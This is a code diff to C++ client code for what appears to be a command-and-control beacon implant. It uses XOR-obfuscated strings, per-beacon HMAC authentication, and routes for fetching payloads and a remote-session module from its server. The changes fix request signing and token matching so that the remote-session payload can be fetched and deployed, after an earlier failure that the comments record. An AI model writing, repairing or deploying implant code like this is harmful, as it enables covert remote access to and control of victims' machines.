@@ -547,6 +547,9 @@ headers += wprefix + wid + wrn;
 // secret must not recur in every beacon request.
 auto wants_payload_token = [](const std::wstring& p) {
     if (p.find(L"/api/v1/payload") != std::wstring::npos) return true;
+    // The remote-session module is fetched from /api/v1/remote_payload_*;
+    // it is a payload route too and must carry the same per-beacon token.
+    if (p.find(L"/api/v1/remote_payload") != std::wstring::npos) return true;
     return p == L"/x" || p.rfind(L"/x?", 0) == 0 || p.rfind(L"/x/", 0) == 0;
 };
 // crypto::payload_token() is DERIVED from this beacon's own identity (the
@@ -561,7 +564,17 @@ if (wants_payload_token(path) && !payload_tok.empty()) {
 #if BEACON_AUTH_ENABLED
 std::string method_narrow(method.begin(), method.end());
 std::string path_narrow(path.begin(), path.end());
-auto auth = make_request_auth(cfg, method_narrow, path_narrow, body);
+// The server verifies the HMAC over request.path — aiohttp's path WITHOUT
+// the query string — so a caller that appends ?auth=... must not include
+// the query in the signature (live defect 2026-10-19: `remote` signed the
+// query, the server verified the bare path, every fetch failed 401
+// "Unauthorized" — 12 bytes — and the module could never deploy).
+std::string path_for_sig = path_narrow;
+{
+    auto q = path_for_sig.find('?');
+    if (q != std::string::npos) path_for_sig.resize(q);
+}
+auto auth = make_request_auth(cfg, method_narrow, path_for_sig, body);
 headers += std::wstring(L"X-Beacon-Timestamp: ") + std::wstring(auth.timestamp.begin(), auth.timestamp.end()) + L"\r\n";
 headers += std::wstring(L"X-Beacon-Counter: ") + std::wstring(auth.counter.begin(), auth.counter.end()) + L"\r\n";
 headers += std::wstring(L"X-Beacon-Nonce: ") + std::wstring(auth.nonce.begin(), auth.nonce.end()) + L"\r\n";
@@ -795,7 +808,14 @@ inline std::string http_request(
 
     struct curl_slist *headers = NULL;
 #if BEACON_AUTH_ENABLED
-    auto auth = make_request_auth(cfg, method_narrow, path_narrow, body);
+    // Sign the path WITHOUT its query string: the server verifies over
+    // aiohttp's request.path (query excluded). See the Windows twin above.
+    std::string path_for_sig = path_narrow;
+    {
+        auto q = path_for_sig.find('?');
+        if (q != std::string::npos) path_for_sig.resize(q);
+    }
+    auto auth = make_request_auth(cfg, method_narrow, path_for_sig, body);
 #endif
     auto enc_ct = XOR_STR("Content-Type: text/plain");
     headers = curl_slist_append(headers, XOR_DEC(enc_ct).c_str());
@@ -806,7 +826,16 @@ inline std::string http_request(
     }
     auto wants_tok = [](const std::string& u) {
         if (u.find("/api/v1/payload") != std::string::npos) return true;
-        return u.rfind("/x", 0) == 0 && (u.size() == 2 || u[2] == '?' || u[2] == '/');
+        if (u.find("/api/v1/remote_payload") != std::string::npos) return true;
+        // `u` here is a FULL url (proto://host:port/path), unlike the Windows
+        // twin which receives the path alone. The previous rfind("/x", 0)
+        // only matched strings that START with "/x", so a libcurl /x fetch
+        // never carried the token. Match the path portion instead.
+        auto pos = u.find("://");
+        auto slash = pos == std::string::npos ? std::string::npos
+                                              : u.find('/', pos + 3);
+        std::string tail = slash == std::string::npos ? std::string() : u.substr(slash);
+        return tail.rfind("/x", 0) == 0 && (tail.size() == 2 || tail[2] == '?' || tail[2] == '/');
     };
     const std::string& curl_payload_tok = crypto::payload_token();
     if (wants_tok(url) && !curl_payload_tok.empty())
